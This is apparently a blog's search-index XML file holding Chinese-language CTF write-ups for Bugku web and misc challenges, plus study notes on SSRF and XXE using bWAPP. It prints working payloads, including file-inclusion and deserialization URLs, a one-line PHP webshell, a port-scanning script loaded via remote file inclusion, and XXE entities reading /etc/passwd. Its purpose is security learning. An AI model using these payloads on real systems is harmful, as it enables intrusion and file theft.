<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Bugku Web Write up]]></title>
    <url>%2FCTF%2FBugku%2FWeb%2FBugku-Web-Write-up.html</url>
    <content type="text"><![CDATA[Bugku Web Write up Bugku平台的Web题的Write up,差不多刷了一遍，总结一下。 前言进度稍微延迟了这么一点，本来是想着前天刷完，昨天写Blog。结果碰上最后几个注入题，有点自闭，多搞了一点时间，导致进度一拖再拖，昨天又玩了一下午游戏无所作为。想着不能再拖了，必须今天写掉，不然过几天忘干净了再写就没意义了。所以稍微少几个题，以后再写吧 直接从题目开写吧，遇到相应知识再拓展。 基础题0x01 Web2点进去一堆滑稽js脚本结合题目描述：“听说聪明的人都能找到答案” ，直接按F12。ctrl+F搜索flag，找到。 0x02 计算器点进题目，发现标题是随机数字运算验证码。本来还以为是要利用Session，写python脚本提交。最后居然只是前端输入框长度被限制。所以打开F12，找到输入框前端代码，更改输入框最大长度，再输入表达式计算值，弹出flag 0x03 web基础$_GET点进去看到题目给了源码。只需构造get请求传入what=flag即可。payload：http://123.206.87.240:8002/get/?what=flag 0x04 web基础$_POST点进去发现题目源码。与上题类似，不过是GET请求变成了POST，使用火狐插件hackbar或者其他类似插件构造post请求即可。这里注意，不要直接用burp将GET改POST，亲测无效。如下图示 不用hackbar正常的GET请求 将GET直接修改成POST提交数据无效这里据我个人分析，是因为直接改成POST后，服务器不知道接受的数据是什么类型。所以得不到flag，于是在文件头中加上Content-Type，得出了flag，证明猜测是对的 文件头加上Content-Type小小总结以后需要改POST的还是直接用hackbar吧，233~ 0x05 矛盾点击题目后，看到源码分析可知，需要GET传入num为数字1才能输出flag，但是如果输入纯数字的话，直接不满足if条件，进不去if语句里面，就输出不了flag。但是这里判断num等于1，用的是==，而不是===，就用到了php弱类型比较，即 1 == 1miracle是为true的。弱类型比较自行参照搜索引擎。于是可以构造payload：http://123.206.87.240:8002/get/index1.php?num=1miracle778 0x06 web3题目描述为: flag就在这里快来找找吧点击题目去，弹了一个框说flag就在这里，来找找吧一开始还没想到flag藏的具体位置，于是只能F12,看一下源码及http文件头。结果发现弹框的那段js代码，如下图,原来”在这里”的意思是说在js代码里。直接找到flag：&lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt; 实体解码即可得flag：KEY{J2sa42ahJK-HS11III} 0x07 你必须让他停下点击题目去，如下图，页面一直在刷新，图片也是不停更换按照图中页面所述，本来以为要停在弹出一个熊猫的图片的地方，结果在页面出等了几秒，发现有些图片根本不存在，只有这一张2333~于是打开burp,看到访问历史里，jpg的名字随机更换，而且页面响应的地方有一个flag is here，如下图划线处。所以可以使用repeat一直按Go重放，直到出现flag为止。 0x08 文件包含好像题目链接挂了。。。 0x09 变量1点击题目，看到源码分析一下，可以看到var_dump那里出现$$,存在变量覆盖，前面正则对args进行了过滤，只能输入[a-z][0-9][A-Z]。因为存在变量覆盖，所以我们传入args=GLOBALS,即可达到输出$GLOBALS数组的目的，GLOBALS为php的超全局变量，一个包含了全部变量的全局组合数组。 0x10 web5题目描述：JSPFUCK??????答案格式CTF{**}点进题目并查看源码，发现一堆js混淆过的jsfuck。复制下来直接输入F12控制台即可得到flag，再将ctf改为大写即可 0x11 头等舱点进题目如图,源代码里也找不到啥东西结合题目：头等舱 猜测flag藏在http头里于是直接在响应的Headers里面找到 初级题0x12 网站被黑点进题目去，是一个如下图示界面,源代码、HTTP头都没找到什么东西结合题目意思，网站被黑，说不定留下了什么后门。于是用御剑(或者其他工具)扫一下后台,发现shell.php访问一下，看到一个登录框,随便输个密码，出现如图所警告到这一步的话，没有其他提示，只能先通过万能密码看看能不能绕过登录，不能的话再暴力破解用万能密码绕过失败，尝试Burp暴力破解，Burp暴力破解具体操作自行百度，或者参考我之前发的Dvwa暴力破解暴力破解选择simple list里的password字典进行爆破得到密码为hack输入密码即可得flag 0x13 管理员系统点进题目如图示,使用万能密码测试登录，提示说IP不允许访问，联系本地管理员登录于是添加XXF(X-Forwarded-For)=127.0.0.1进行登录尝试，提示说密码不对从上面尝试知道，万能密码不管用，所以密码可能藏在某个地方(也是凑巧发现233~)查看源代码，发现有一行诡异的base64注释，解码可得内容为test123于是用admin&amp;test123进行登录，同时添加XXF头，得到flag 0x14 web4题目如图示按提示查看源代码，如图发现一段被url编码的js脚本将这段代码进行解码，如图示通过阅读源码分析，只要在输入框输入67d709b2b54aa2aa648cf6e87a7114f1即可得到flag 0x15 flag在index里题目如图示点击链接后跳转到如图示地址很明显存在文件包含，结合题目标题 flag在index里，构造payload：http://123.206.87.240:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php获取index.php源码将获取到的base64解码后得到网页源码,找到flag 0x16 输入密码查看flag题目如图很明显，用Burp暴力破解,得到密码为13579输入得flag：flag{bugku-baopo-hah} 0x17 点击一百万次题目hints为:JavaScript题目如图，每点击这个图片一次，数量加1，当数量为100万的时候出来flag显然，不可能为了一个flag浪费一个鼠标233~结合题目给的hints，于是查看前端关于点击的js代码分析可知，点击一次clicks加1，当clicks大于100万的时候，提交一个表单，value等于clicks的值，所以我们直接POST提交clicks即可。 0x18 备份是个好习惯点击题目如图示,出现一段hash编码乍一看还以为是md5，算了下长度，发现是64位，但是前32位跟后32位是相同的。感觉有点奇怪，于是把前32位md5解密一下，发现是个空密码。所以这段编码估计是没有什么用了。那应该怎么做呢?题目描述是备份是个好习惯猜测可能是备份文件泄露漏洞。于是访问index.php.bak，可以下载。于是打开备份文件查看源码分析一下，这里代码意思是，第11行获取url ?及?后的字符串,第12行去除?,第13行剩下字符串中的key替代成’’,第14行解析字符串，即将 key1=234&amp;key2=123解析成$key1=234、$key2=123。到了这里就应该明白了，主要考察两个点，第一是13行处，绕过str_replace。绕过之后，来到第二处，md5弱类型比较。对于第一个点，可以使用双写绕过，第二个点的话，可以利用两个字符串md5都是0e开头绕过，或者将key1 key2赋为两个不同数组进行绕过(md5不能对数组进行操作，会返回null=null) payload1: http://123.206.87.240:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kekeyy2=aabg7XSspayload2: http://123.206.87.240:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=12 0x19 成绩单打开题目链接后,题目如图示简单的输入 1’、1’#测试后，发现存在sql注入漏洞，于是开始进行注入 用order by测试出有4个字段 union查看一下哪些字段可显示 爆表 爆fl4g表的列 爆flag值 入门题0x20 秋名山老司机点进链接，题目如图示请在两秒内计算车速，很明显要用到python脚本。但计算出车速来应该怎么提交呢?于是多刷新几遍,发现题目偶尔会变成下图示，里面讲到了通过post提交参数value于是写一个python脚本1234567891011121314151617181920#!/usr/bin/env python3# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: file content@Date: 2019-04-01 10:24:57@LastEditTime: 2019-04-01 12:59:49'''import requestsfrom bs4 import BeautifulSoups = requests.Session()r = s.get('http://123.206.87.240:8002/qiumingshan/')soup = BeautifulSoup(r.text,'html.parser')exp = soup.find_all('div')[0].string[:-3]# print(exp)value = &#123;'value':eval(exp)&#125;r = s.post('http://123.206.87.240:8002/qiumingshan/',data=value)print(r.text) 利用bs4提取表达式并计算。然后使用POST提交运行脚本即可得flag 0x21 速度要快题目点进去如图示没找到别的信息。用burp看一下http头部跟页面源码，发现下图示信息。上图注释信息说明需要POST提交参数margin的值，margin的值估计就是头部中的flag。将头部中的flag base64解密一下得到如下信息于是进行POST提交 margin=NDk4MDQ2,用火狐hackbar提交后，提示说不够快既然手工不够快，那就用python跑一下吧。12345678910111213141516171819202122#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: file content@Date: 2019-04-01 13:06:09@LastEditTime: 2019-04-04 20:48:35'''import requestsimport base64s = requests.Session()r = s.get('http://123.206.87.240:8002/web6/')flag_header = r.headers['flag'].encode('utf-8')flag_message = base64.b64decode(flag_header).decode('utf-8')tmp_list = flag_message.split(': ')margin = base64.b64decode(tmp_list[-1].encode('utf-8')).decode()data = &#123;'margin':margin&#125;r = s.post("http://123.206.87.240:8002/web6/",data=data)print(r.text) 跑一下，出来结果 0x22 cookies欺骗打开题目链接页面如下页面一段字符，看上去也不像什么编码。于是找http头部看看有没有啥提示。但找了一圈并没有发现。但是看到访问url时，发现有的猫腻，url两个参数，一个line、另一个filename，filename的值还用base64加密了一手。于是将filename的值解密一下看看，解密结果为keys.txt。直接访问keys.txt看一下。与前面内容一样所以可以得出结论，前面index.php的两个参数line和filename可以用来读取网页源文件，于是将index.php用base64加密，line从0开始，将index.php一行行读出来。避免繁琐，可以写个python脚本。123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: 导出生成index.php@Date: 2019-04-01 13:37:02@LastEditTime: 2019-04-01 14:01:33'''import requestsurl = 'http://123.206.87.240:8002/web11/index.php'# url.format(2)data = &#123;'filename':'aW5kZXgucGhw'&#125;res = ''# r = requests.get(url+'?line=100',params=data)for i in range(100): data['line'] = i r = requests.get(url,params=data) if r.text == '': break res += r.textf = open('./Bugku/Web/cookies欺骗/index.php','w')f.write(res)f.close 得到index.php源码由index.php源码可知，只能通过filename读取file_list数组里的文件，而如果想读取keys.php的话，就需要构造cookie使得$_COOKIE[‘margin’]==’margin’成立。于是再写一个python脚本，添加上Cookie值，将keys.php再导出来123456789101112131415161718192021222324252627#!/usr/bin/env python# coding=UTF-8'''@Author: Miracle778@LastEditors: Miracle778@Description: 导出keys.php@Date: 2019-04-01 14:01:56@LastEditTime: 2019-04-01 14:11:45'''import requestsurl = 'http://123.206.87.240:8002/web11/index.php'# 设置cookie不通过header# header = &#123;'Cookie':&#123;"margin":"margin"&#125;&#125;cookie = &#123;'margin':'margin'&#125;data = &#123;'filename':'a2V5cy5waHA='&#125;res = ''for i in range(100): data['line'] = i r = requests.get(url,params=data,cookies=cookie) if r.text == '': break res += r.text# print(res)f = open('./Bugku/Web/cookies欺骗/keys.php','w')f.write(res)f.close keys.php的源码如下图得到flag 0x23 never give up点进题目去，如图示流程走一遍，查看源码及http头，在源码处发现提示：1p.html访问一下，发现直接被重定向了。于是只好查看1p.html的源代码,发现一段编码解密后得到下面代码123456789var Words ="&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;" function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord(); 其余代码无关紧要，作用就是进行重定向。真正有用的是&lt;!–里这段base64编码，将这段编码先base64再url解码得到下面代码。12345678910111213141516171819202122232425";if(!$_GET['id'])&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("f4l2a3g.txt");&#125;else&#123; print "never never never give up !!!";&#125;?&gt; 到这里就很明显了，传入a,b,id三个参数，分别满足if条件即可在这里，a利用的是文件包含，用php://input协议传入数据;b利用ereg函数的%00截断以同时满足eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4这两个矛盾点;还有一个id == 0容易被忽略，本来我以为直接id=0就能绕过，这个条件是不是太简单了。后面发现id = 0的话，!$_GET[‘id’]就满足了，直接退出，根本就到不了后面，所以id还要利用一手php弱类型比较所以最终payload为：url: http://123.206.87.240:8006/test/hello.php?id=0miracle778&amp;a=php://input&amp;b=%001234566post:bugku is a nice plateform!当然也可以直接访问f4l2a3g.txt，233 0x24 welcome to bugkuctf点进题目去，F12审查一下元素发现代码，简单审计后，发现可以文件包含。构造payloadurl: http://123.206.87.240:8006/test1//test1/?txt=php://input&amp;file=php://filter/read/convert.base64-encode/resource=hint.phppost: welcome to the bugkuctf得到hint.php源码12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 这里得到信息还是不够完善，于是将上面payload中的file更改一下，将index.php源码读出来1234567891011121314151617181920&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo "you are not the number of bugku ! "; &#125; ?&gt; 由index.php代码分析来看，flag应该藏在flag.php里，但是通过文件包含应该是出不来，因为include前进行了一步正则匹配，file参数值不能含flag，双写flag也没能绕过去。所以文件包含是得不到flag的，往下看，发现$password = unserialize($password);终于第三个参数用到了。这里存在反序列化漏洞。具体参考:php反序列化漏洞于是可以构造payloadurl: http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}post: welcome to the bugkuctf 0x25 过狗一句话题目描述：123456&lt;?php $poc="a#s#s#e#r#t"; $poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt; 实际就是 assert($_GET[&#39;s&#39;]) 一句话木马所以可以传入 s=cmd 进行命令执行于是构造 s=print_r(scandir(‘./‘)) 进行文件扫描。看到一个flag_xx.txt直接访问即可或者构造 s=print_r(readfile(‘./flag_sm1skla1.txt’))读取 2019/4/8 更 0x26 字符？正则？题目链接进去，发现给了代码，这就好办了，把代码看懂就好了。这里的意思是GET传入id的值进行一个正则匹配，匹配的话就能得到flag。直接给个链接学一波PHP正则构造符合条件的payload: keyAAkeyAAAAkey:/A/AAkeya@得到flag 0x27 login1(SKCTF)题目hint说是 SQL约束攻击点进去看到是一个管理系统登录框试了下万能密码，发现绕不过去，然后发现有注册功能，随便注册一个账号，用注册的账号进行登录，发现提示说不是管理员不能看flag然后理所当然的去注册admin账号，不出意外的果然提示说admin已存在我做的时候是没有看到hint的，于是自然而然想是不是可以通过sql注入，注入update语句修改admin密码，从而达到目的。后面自然是失败了。后面实在没办法，只能去看看别人的WP了，结果才发现有hint，2333~,以后一定要仔细看题目。那提示是说SQL约束攻击，于是百度一下。基于约束的SQL攻击使用’admin ‘做用户名进行注册登录即可。 0x28 你从哪里来题目进去是一句话 ：are you from google?很容易就联想到更改http头部，增加Referer 0x29 md5 collision(NUPT_CTF)这个题目之前在南邮网络攻防平台上做过，不过那边给了代码，这里代码提示什么都没给，只有一个please input a，有点尴尬，这里虽然知道怎么做，但是还是不写好了。 0x30 程序员本地网站题目进去说请从本地访问···感觉有点瓜皮，这题目做着做着又回到前面几题简单题一样了。直接修改XXF头为127.0.0.1即可。图都懒得截了。 0x31 各种绕过题目进去又给代码。分析一下，id 可以url双重编码绕过，uname和passwd只能用sha1对数组操作返回Null来绕过了。这里注意passwd使用post提交的，之前0x04的时候说过，post请求还是用hackbar提交吧。这里也是，用burp直接提交是得不到flag的。还是要用hackbar提交一手 小小总结新版火狐的hackbar也有个小缺点，就是post提交数据的时候，一定要有参数名，也就是说遇上php://input这种的话，Execute不动，post不了数据。所以做个小总结，遇见php://input用burp，遇见post name=value这种用hackbar，遇见两者皆有，那就用burp改GET为POST,手动加Content-Type。 0x32 web8题目描述：txt？？？？题目进去又有代码看很明显了，看到file_get_contents就要想到php://input最后payloadurl:http://123.206.87.240:8002/web8/?ac=Miracle778&amp;fn=php://inputpost:Miracle778 0x33 细心题目描述：想办法变成admin题目进去如下图网页源代码及http头找了一遍没找到啥信息或提示于是直接扫后台吧。不过扫之前可以先试试robots.txt存不存在这里是存在的，访问一下看看,发现存在一个resusl.php访问一下，得到下图页面看到 管理员、IP这两个字，都顾不得别的，弄得我直接改XXF头为127.0.0.1，然并卵，并无任何作用。后面仔细分析，看到那句代码 if($_GET(x)==$password),感觉有点奇怪，这password鬼知道是谁。。后面回看一下题目，题目叫细心，描述说想办法变成admin，么得办法，把admin当password提交一手，还真就爆出来flag了。 分界线 今天就到这~~择日再更]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Bugku</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF学习]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FSSRF%2FSSRF%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[SSRF漏洞学习 关于SSRF的一些学习笔记，会介绍SSRF的利用原理及两个bWapp中关于SSRF的案例 前言学习SSRF的一些笔记，记录一遍，以便加深印象。话不多说，先给出链接参考链接：SSRF、SSRF学习之路 SSRF是什么 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成，服务端发起请求的一个安全漏洞。一般情况下，SSRF的目标是目标网站的内部系统。（因为他是从内部系统访问的，所以可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） SSRF形成原因 SSRF形成的原因大多是由于服务端提供了从其他服务器应用获取数据的功能，但没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。 总结来说SSRF漏洞就是黑客通过篡改服务器获取资源的请求，而服务器并没有检测这个请求是否合法，然后黑客就可以以目标网站的身份来访问服务器的一些内部资源 SSRF的用途SSRF可以用来： 内外网的端口和服务扫描 目标网站本地敏感数据的读取 内外网主机应用程序漏洞的利用 内外网Web站点漏洞的利用… SSRF漏洞常见出现位置由上面叙述中可以得知，SSRF漏洞都是在服务端获取其他站点的资源的过程中形成的。故可以盯紧调用外部资源的参数寻找SSRF漏洞这里具体可以参考: SSRF漏洞的挖掘经验就简单概括一下吧，具体看上述链接 分享：通过URL地址分享网页内容 转码服务 在线翻译 图片加载与下载：通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找: share wap url link src source target u 3g display sourceURl imageURL domain ... SSRF漏洞的简单判断方法 因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞 在页面源码中查找访问的资源地址,如果资源地址类型为www&#46;hdu&#46;edu&#46;cn/xxx.php?image=\的话，则有可能出现SSRF漏洞 SSRF实例 —— bWapp中的SSRF任务列表选择bWapp中的SSRF环境，可以看到有三个任务，第三个因为没有实验环境，所以就做两个。 0x01 利用RFI进行端口扫描点击 Port scan，获取一个利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpecho "&lt;script&gt;alert(\"U 4r3 0wn3d by MME!!!\");&lt;/script&gt;";if(isset($_REQUEST["ip"]))&#123; //list of port numbers to scan $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306); $results = array(); foreach($ports as $port) &#123; if($pf = @fsockopen($_REQUEST["ip"], $port, $err, $err_string, 1)) //创建一个套接字连接到指定IP，成功返回句柄，失败false &#123; $results[$port] = true; fclose($pf); &#125; else &#123; $results[$port] = false; &#125; &#125; foreach($results as $port=&gt;$val) &#123; $prot = getservbyport($port,"tcp"); //返回端口对应协议 echo "Port $port ($prot): "; if($val) &#123; echo "&lt;span style=\"color:green\"&gt;OK&lt;/span&gt;&lt;br/&gt;"; &#125; else &#123; echo "&lt;span style=\"color:red\"&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;"; &#125; &#125;&#125;?&gt; 分析代码相应重要注释我已经在上面代码中写出，这里就简单写写。 首先看到if(isset($_REQUEST[&quot;ip&quot;]))，先要提交传递IP参数才能激活脚本。 然后是两个foreach循环，第一个循环是标记出目标IP 21, 22, 23, 25, 53, 80, 110, 1433, 3306这些常用端口的开放情况，开放即为true、关闭为false。第二个循环是将上一个循环判断得出的端口开放情况并加上端口对应的服务协议输出。 利用脚本 将bWapp的漏洞环境切换为RFI/LFI 可以看到有个选择语言的按钮，点击后观察到页面的url变化为http://192.168.164.131/bWAPP/rlfi.php?language=lang_en.php&amp;action=go,其中language参数此处存在远程文件包含漏洞，也就是说可以通过此处调用恶意脚本。 脚本的url地址是http://192.168.164.131/evil/ssrf-1.txt,将url复制下来，构造payload POST: http://192.168.164.131/bWAPP/rlfi.php?language=http://192.168.164.131/evil/ssrf-1.txt&amp;action=goPOST Data: ip=xx.xx.xx.xx 0x02 利用XXE获取敏感文件中的内容点击 Access 获取脚本1234567891011121314151617# Accesses a file on the internal network (1)&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;# Accesses a file on the internal network (2)# Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml"&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt; 利用脚本此处是利用bWapp中的XXE环境进行实验，关于bWapp中XXE的实验我之前已经写过了这里就不多说了。区别就是将payload分别换成此处脚本中的。 获取robots.txt文件 获取heroes.html源码 总结SSRF就到这里了。现在都在更些基础的东西，希望日后能多写点更深层次的。]]></content>
      <categories>
        <category>Web安全</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Misc学习(一)]]></title>
    <url>%2FCTF%2FBugku%2FMisc%2FMisc%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89.html</url>
    <content type="text"><![CDATA[Misc学习(一) 准备学学CTF了。先从一些基础题开始，做做Bugku、实验吧一些线上平台的Misc、Web题目，边学边做，顺便水水博客，就当做学习笔记了。 前言准备刷下Bugku上的Misc题。总结下规律(常见套路)。之后对其他平台其他题也会做做写写。 Misc基础加解题思路这里就不瞎搬了，直接给链接吧。CTF解题技能之MISC基础。这篇文章应该讲的还是挺清楚的(反正我是看这篇开始的)。 BugKu Misc WP基本知识可参看上面链接，接下来就开始写WP了。 0x01 这是一张简单的图片点进题目去，发现是一张jpg图片。Misc题目中，遇到图片，首先用winhex、Ultraedit等十六进制查看器查看。看看其中有没有隐藏什么信息，一般主要在文件尾藏信息。 比如这题，用Ultraedit查看，可以看到，文件尾部有下图所示数据。很明显，是html实体编码。于是解码得flag 0x02 隐写点进题目进去，是一个rar文件，解压后得到一个PNG文件按照惯例，UE查看一下十六进制，发现没有什么异常数据，于是扔到binwalk跑一下，看看有没有别的隐藏文件。看到有两个zlib文件，想着用dd命令提取出来就行了。但是提出了解压不了。再联想到题目名字叫隐写，应该flag在图片里，图片被做了手脚。于是找了一下这题的wp，看看别人怎么做的。得到如下结论： 用16进制编辑工具更改图片的高度，会只显示图片的一部分，下面的部分就被隐藏了，是个藏东西的好办法 PNG文件结构中的IHDR数据块包含有PNG文件中存储的图像数据的基本信息。 于是用UE修改PNG的高度,生成新图片新图片如下 0x03 telnet看题目名字telnet，大约能估计出来应该是个流量分析题。果不其然，点进题目下载zip文件后，解压得到pcap文件。用wireshark打开,然后找flag，自己做的时候是一个个报文找过去的，有点难受，所以特此附上流量分析wireshark常用操作快速找到flag方法右键wireshark，追踪TCP流 0x04 眼见非实(ISCCCTF)点进题目后，下载得到一个名字叫zip没有后缀的文件。 此时可用UE等查看其文件头确认其文件类型，手动添加后缀。附上常见文件文件头 或者扔进linux里面(linux里面文件没有所谓后缀名)，用file命令查看。 得到结果为，这是一个zip文件。在windows下面添加后缀，解压出来得到一个打不开的docx文件。一个打不开的docx文件，猜想可能不是docx文件。于是按上面流程再走一遍，发现这个docx文件也是个zip文件，再次解压得到一个文件夹，里面包含一些xml文件。结构如下图然后查找flag。面对这么多文件查找，这个时候就要通过linux grep命令了。 0x05 啊哒点进题目，下载一个zip文件。解压得到一张图片。对于图片的处理，上面几题已经说得差不多了，走流程下来后，将图片扔进binwalk里，发现里面包含一个zip文件。用dd命令提取隐藏的zip包出来并解压，可以看到这个提取出来的zip包里面包含flag.txt，但解密需要密码。 压缩包解密需要密码应该是一种Misc常见题型。于是上网搜索一圈，发现好像都太复杂，跟这个题目不合(后面做多了应该会遇到吧)。实在没办法，于是上网搜别人的wp，看怎么解决。 原来密码藏在的开始的ada.jpg图片的详细信息中，将这串字符当密码输一遍发现不对。于是进行变形，将这串字符进行解密。最后将这串字符转成ascii码，得到密码:sdnisc_2018输入密码解压后得到flag 0x06 又一张图片，还单纯吗点进题目，下载一张jpg图片。用binwalk跑一下，得到下面信息:可以看到，里面包含了多个图片文件，此时就用到foremost工具了语法：foremost &lt;filename&gt; [-o &lt;outputdir&gt;]提取成功后，得到flag图片 总结先写到这吧，后面陆续再更…]]></content>
      <categories>
        <category>CTF</category>
        <category>Bugku</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE学习]]></title>
    <url>%2FWeb%E5%AE%89%E5%85%A8%2FXXE%2FXXE%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[XXE漏洞学习 学习XXE过程中的一些笔记，内容包括XXE的前置知识 XML、DTD等，以及bWapp中XXE的漏洞利用实验 前言本来是想了解一下SSRF的，结果找到讲bWapp的SSRF的博客，里面有一个关于XXE的SSRF，索性就先把XXE看一下。参考链接: XXE前置知识 bWapp之XXE XXE和XML、DTD先分别说一下这三个词的概念吧 XXEXXE全称XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。要想搞懂XXE，肯定要先了解XML语法规则和外部实体的定义及调用形式。 DTDDTD全称Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 XMLXML 指可扩展标记语言，被设计用来传输和存储数据。 学习链接关于XML跟DTD的语法规则，我也是才看，还是不多说了，直接给教程链接吧。其中DTD的实体声明重点看XML教程DTD教程 基本Payload结构123456&lt;?xml version="1.0" encoding="UTF-8"?&gt; //xml声明&lt;!DOCTYPE miracle [ //DTD部分 &lt;!ELEMENT miracle ANY &gt; //元素类型声明 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt; //实体声明里的外部实体声明&lt;miracle&gt;&amp;xee;&lt;/miracle&gt; //XML部分 DTD实体声明上述Payload分析稍微对linux有点了解的，看到上面的Payload结构中的DTD部分外部实体声明即&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;这一句就应该猜到这个Payload的作用了吧。没错，这个Payload的作用是输出目标服务器(服务器若为Linux)的passwd文件。那如果想用XXE漏洞进行一些别的操作，如:内网探测、内网入侵该怎么办呢？那就要讲到DTD实体声明了。 实体声明又分为内部实体声明、外部实体声明、参数实体声明等。这里就只讲外部实体声明、参数实体声明吧 